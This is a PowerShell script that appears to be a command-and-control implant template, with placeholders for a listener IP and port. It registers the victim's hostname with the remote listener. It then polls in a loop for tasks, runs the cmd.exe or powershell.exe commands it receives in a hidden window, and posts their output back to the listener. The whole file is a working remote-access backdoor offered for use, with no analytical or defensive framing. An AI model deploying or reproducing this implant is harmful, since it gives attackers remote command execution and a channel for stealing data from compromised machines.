$ip   = "{{LISTENER_IP}}"
$port = "{{LISTENER_PORT}}"
$sleep_time = 3
$name = ""

$hname = [System.Net.Dns]::GetHostName()
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg")
$data  = @{
    name = "$hname" 
}
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

for (;;){
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    
    if (-Not [string]::IsNullOrEmpty($task)){
        $task = $task.split()
        $command = $task[0]
        $args = $task[1..$task.Length]

        if ($command -eq "shell") {
            $f    = "cmd.exe"
            $arg  = "/c "
                    
            foreach ($a in $args){ $arg += $a + " " }

            $res  = shell $f $arg
            $data = @{result = "$res"}
                        
            Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

        } elseif ($command -eq "powershell") {
            $f    = "powershell.exe"
            $arg  = "/c "
                    
            foreach ($a in $args){ $arg += $a + " " }

            $res  = shell $f $arg
            $data = @{result = "$res"}
                        
            Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

        } elseif ($command -eq "terminate"){
	        exit
        }
    }
    
    sleep $sleep_time
}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.CreateNoWindow         = $true;
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    if (-Not $stderr) {
        $res = $stdout
    } else {
        $res = "$stdout`n$stderr"
    }

    $res
}